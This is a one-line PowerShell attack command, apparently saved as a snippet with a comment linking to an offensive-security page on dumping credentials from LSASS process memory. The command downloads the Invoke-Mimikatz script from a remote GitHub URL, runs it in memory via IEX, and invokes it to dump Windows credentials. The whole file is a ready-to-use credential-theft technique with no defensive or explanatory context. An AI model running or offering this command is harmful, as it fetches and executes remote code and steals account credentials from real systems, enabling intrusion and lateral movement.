#https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds

